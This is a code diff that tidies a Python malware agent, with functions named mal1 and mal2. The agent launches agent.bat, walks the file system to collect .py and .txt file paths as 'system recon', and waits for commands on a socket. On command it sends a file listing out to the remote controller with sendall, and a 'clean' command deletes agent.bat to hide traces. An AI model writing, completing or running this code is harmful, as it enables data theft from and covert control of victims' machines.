@@ -5,17 +5,15 @@ secrets = []
 filebytes = []
 def mal1():
     os.system('agent.bat')
-    #os.system('echo stolenpasses >> passwords.txt')
 
 def mal2():
     print('system recon')
 
     for root, dirs, files in os.walk(".", topdown = False):
         for name in files:
-            #print(os.path.join(root, name))
+      
             for i in files:
                 tt = re.findall("\w*[\.]py|\w*[\.]txt", str(i) )
-                #if len(tt) > 0: print("match: : " + str(tt))
                 if len(tt) > 0:
                     yu = os.path.join(root, name)
                     pys.append(yu)
@@ -23,7 +21,7 @@ def mal2():
         for name in dirs:
             for i in files:
                 tt = re.findall("\w*[\.]txt", str(i) )
-                #if len(tt) > 0: print("match: : " + str(tt[0]))
+               
                 if len(tt) > 0: txts.append(str(tt[0]))
     
 
@@ -49,8 +47,7 @@ while True:
         filename = "currentfiles.txt"
         # get the file size
         filesize = os.path.getsize(filename)
-        #a.send(f"filez {filename}-{filesize}".encode())
-        #time.sleep(2)
+
         with open(filename, "rb") as f:
             while True:
                 # read the bytes from the file
@@ -60,11 +57,11 @@ while True:
                     # file transmitting is done
                     print('done!!')
                     break
-                #a.send(str(bytes_read).encode())
+                
                 a.sendall(str(bytes_read).encode())
         print('step 1 complete')
         time.sleep(1)
-        #a.send('step1a'.encode())
+        
     elif data.decode() == 'clean':
         os.system('copy agent.bat agent.txt && del agent.bat')
         time.sleep(1)
